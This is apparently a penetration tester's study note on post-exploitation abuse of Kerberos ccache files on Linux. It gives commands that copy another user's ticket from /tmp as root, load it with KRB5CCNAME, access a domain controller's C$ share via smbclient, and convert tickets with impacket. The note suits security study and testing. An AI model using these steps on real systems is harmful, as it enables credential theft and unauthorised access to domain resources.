---
tags:
  - Kerberos
  - Post-Exploitation
  - OperatingSystems
  - Linux
  - Concepts
  - Information
---
To abuse a ccache file, all we need is read privileges on the file. These files, located in `/tmp`, can only be read by the user who created them, but if we gain root access, we could use them.
#### Importing the ccache File into our Current Session

```shell-session
root@linux01:~# klist

klist: No credentials cache found (filename: /tmp/krb5cc_0)
```
```shell-session
cp /tmp/krb5cc_647401106_I8I133 .
```
```shell-session
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```
```shell-session
klist
```

See [[2. Enumeration/TCP/445. Server Message Block (SMB)/1. Guide|SMB]]

```shell-session
smbclient //dc01/C$ -k -c ls -no-pass
```


### Using Tools

See [[Evil-WinRM#Kerberos]] and [[1. SSH Tunnelling#Chisel]]


## Converting Between Windows and Linux Ticket Files

If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [[Impacket#Impacket Ticket Converter]] to convert them.

Ccache to `Kirbi`

```shell-session
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows.